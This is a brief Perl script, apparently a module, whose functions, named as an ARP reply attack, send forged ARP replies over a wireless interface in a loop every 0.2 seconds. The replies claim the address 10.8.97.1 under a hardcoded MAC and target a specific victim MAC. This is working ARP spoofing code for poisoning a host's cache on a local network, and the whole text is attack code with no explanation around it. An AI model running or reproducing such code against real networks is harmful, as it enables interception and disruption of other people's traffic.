my $arpreply_attackstatut = 1;
sub ARPReply_Attack_Stop{
	$arpreply_attackstatut = 0;
}

sub ARPReply_Attack_Start{
	while ($arpreply_attackstatut) {
		Net::ARP::send_packet('wlan0',                 # Device
            '10.8.97.1',          # Source IP
            '0.0.0.0',          # Destination IP
            '94:db:c9:47:dc:6d',  # Source MAC
            '64:27:37:98:80:47',  # Destinaton MAC
            'reply');             # ARP operation
		Time::HiRes::sleep(0.2);
	}
}

return 1;